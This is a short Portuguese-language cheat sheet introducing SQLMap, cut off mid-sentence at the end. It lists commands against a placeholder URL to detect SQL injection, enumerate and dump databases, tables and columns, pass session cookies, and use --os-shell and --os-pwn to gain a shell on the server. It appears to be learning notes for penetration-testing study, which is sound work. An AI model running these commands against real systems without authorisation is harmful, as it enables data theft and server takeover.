# SQLMap: The Basics 💉

## 📌 O que é o SQLMap?
- **SQLMap** é uma ferramenta automatizada para detecção e exploração de vulnerabilidades de **SQL Injection**.  
- Facilita ataques que seriam feitos manualmente, identificando parâmetros vulneráveis e permitindo **extração de dados, acesso ao sistema operacional e até escalonamento de privilégios**.  

---

## 🚀 Uso Básico
Executar um teste simples de injeção:
```bash
sqlmap -u "http://site.com/page.php?id=1"
```
- `-u` → define a URL alvo.
- SQLMap irá testar automaticamente injeções comuns.
  Opções Importantes
## 🔍 Detecção
```bash
sqlmap -u "http://site.com/page.php?id=1" --dbs
```
`--dbs` → lista os bancos de dados disponíveis.
```bash
sqlmap -u "http://site.com/page.php?id=1" --tables -D <banco>
```
`--tables -D` → lista as tabelas dentro de um banco específico.
```bash
sqlmap -u "http://site.com/page.php?id=1" --columns -D <banco> -T <tabela>
```
`--columns` → lista colunas de uma tabela.
```bash
sqlmap -u "http://site.com/page.php?id=1" --dump -D <banco> -T <tabela>
```
`--dump` → extrai os dados da tabela alvo.
⚙️ Opções de Autenticação
```bash
sqlmap -u "http://site.com/page.php?id=1" --cookie="PHPSESSID=12345"
```
--cookie → permite usar sessões autenticadas.
```bash
sqlmap -u "http://site.com/page.php?id=1" --auth-type=basic --auth-cred="user:pass"
```
`--auth-type` + `--auth-cred` → autenticação HTTP básica/digest.
## 🎯 Controle de Alvo
```bash
sqlmap -r request.txt
```
`-r` → usa um arquivo de requisição HTTP (capturado pelo Burp Suite, por exemplo).
```bash
sqlmap -u "http://site.com/page.php?id=1" --level=5 --risk=3
```
`--level` (1-5) → profundidade dos testes.
`--risk` (1-3) → risco dos payloads.

## 💻 Acesso ao Sistema
```bash
sqlmap -u "http://site.com/page.php?id=1" --os-shell
```
`--os-shell` → obtém uma shell interativa no servidor.
```bash
sqlmap -u "http://site.com/page.php?id=1" --os-pwn
```
`--os-pwn` → tenta acesso direto ao sistema (meterpreter
